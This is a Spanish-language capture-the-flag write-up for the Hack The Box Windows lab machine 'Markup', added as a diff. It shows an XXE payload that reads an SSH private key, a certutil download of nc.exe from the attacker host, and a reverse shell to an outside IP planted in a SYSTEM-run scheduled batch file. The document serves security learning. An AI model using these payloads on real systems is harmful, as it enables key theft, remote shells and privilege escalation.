@@ -1,0 +1,178 @@
+# HTB — Markup
+
+**Dificultad:** Easy  
+**OS:** Windows  
+**Técnicas:** XXE Injection, SSH con clave privada, Privilege Escalation vía Scheduled Task  
+
+---
+
+## Reconocimiento
+
+Escaneo inicial con nmap:
+
+```bash
+nmap -sV -sC -oN nmap/markup 10.129.5.180
+```
+
+Puertos relevantes:
+- **80/tcp** — Apache 2.4.41 (Win64) PHP/7.2.28
+- **22/tcp** — OpenSSH
+- **443/tcp** — HTTPS
+
+---
+
+## Fase 1 — XXE Injection
+
+### Descripción de la vulnerabilidad
+
+La aplicación web en `/services.php` procesa pedidos enviados en formato XML. El parser XML no restringe la declaración de entidades externas (**XML External Entity**), lo que permite referenciar archivos del sistema de archivos del servidor.
+
+### Explotación
+
+Se intercepta la petición con **Burp Suite** al enviar un pedido. El cuerpo XML original es:
+
+```xml
+<?xml version="1.0"?>
+<order>
+    <quantity>2</quantity>
+    <item>Home Appliances</item>
+    <address>test</address>
+</order>
+```
+
+Se modifica para declarar una entidad externa e invocarla en el campo `<item>`, que se refleja en la respuesta del servidor:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
+<order>
+    <quantity>2</quantity>
+    <item>&xxe;</item>
+    <address>test</address>
+</order>
+```
+
+> **Clave:** La entidad debe ser referenciada con `&xxe;` en algún campo que se refleje en la respuesta. Sin la referencia, el parser la ignora.
+
+La respuesta devuelve la **clave privada SSH** del usuario `daniel`.
+
+### Acceso inicial
+
+Se guarda la clave privada, se ajustan permisos y se conecta por SSH:
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa daniel@10.129.5.180
+```
+
+---
+
+## Fase 2 — Enumeración local
+
+Dentro de la máquina como `daniel`, se enumera el sistema:
+
+```cmd
+cd C:\
+dir
+cd Log-Management
+dir
+icacls job.bat
+```
+
+Resultado del `icacls`:
+
+```
+job.bat  BUILTIN\Users:(F)
+         NT AUTHORITY\SYSTEM:(I)(F)
+         BUILTIN\Administrators:(I)(F)
+         BUILTIN\Users:(I)(RX)
+```
+
+> **Observación clave:** `BUILTIN\Users` tiene permisos de **escritura (F)** sobre `job.bat`, y `NT AUTHORITY\SYSTEM` lo ejecuta periódicamente mediante el Task Scheduler.
+
+---
+
+## Fase 3 — Privilege Escalation
+
+### Vector
+
+`job.bat` es ejecutado como **SYSTEM** por una tarea programada. Como `daniel` puede sobreescribirlo, se puede inyectar una reverse shell.
+
+### Pasos
+
+**1. Transferir nc.exe a la víctima**
+
+En Parrot OS, localizar el binario:
+
+```bash
+find / -name "nc.exe" 2>/dev/null
+# /usr/share/windows-resources/binaries/nc.exe
+
+cp /usr/share/windows-resources/binaries/nc.exe .
+python3 -m http.server 80
+```
+
+En la víctima, descargar con certutil (wget no existe en Windows por defecto):
+
+```cmd
+certutil -urlcache -split -f http://10.10.14.74/nc.exe nc.exe
+```
+
+**2. Abrir listener en Parrot**
+
+```bash
+nc -lvnp 4444
+```
+
+**3. Sobreescribir job.bat**
+
+```cmd
+echo C:\Log-Management\nc.exe -e cmd.exe 10.10.14.74 4444 > job.bat
+```
+
+**4. Esperar la ejecución del scheduler (~1-2 minutos)**
+
+Se recibe la shell como `NT AUTHORITY\SYSTEM`.
+
+---
+
+## Flags
+
+```cmd
+# User flag
+type C:\Users\daniel\Desktop\user.txt
+
+# Root flag
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+---
+
+## Resumen del ataque
+
+```
+XXE Injection
+  └─ Leer id_rsa de daniel
+       └─ Acceso SSH como daniel
+            └─ job.bat writable + ejecutado como SYSTEM
+                 └─ Reverse shell → NT AUTHORITY\SYSTEM
+```
+
+---
+
+## Conceptos clave
+
+| Técnica | Descripción |
+|---|---|
+| **XXE** | El parser XML procesa entidades externas no restringidas, permitiendo LFI |
+| **LFI via XXE** | Lectura de archivos arbitrarios del servidor (`file://`) |
+| **Misconfigured ACLs** | Permisos de escritura en archivos ejecutados con privilegios elevados |
+| **Scheduled Task Abuse** | Un script modificable ejecutado por SYSTEM → privesc |
+
+---
+
+## Notas adicionales
+
+- En Windows CMD no existe `wget`. Alternativas: `certutil`, `powershell Invoke-WebRequest`, `bitsadmin`
+- El campo XML que se refleja en la respuesta es el vector de salida del XXE — si no hay reflexión, explorar OOB (Out-of-Band) exfiltration
+- Siempre verificar permisos de archivos con `icacls` en Windows y `ls -la` en Linux durante la enumeración
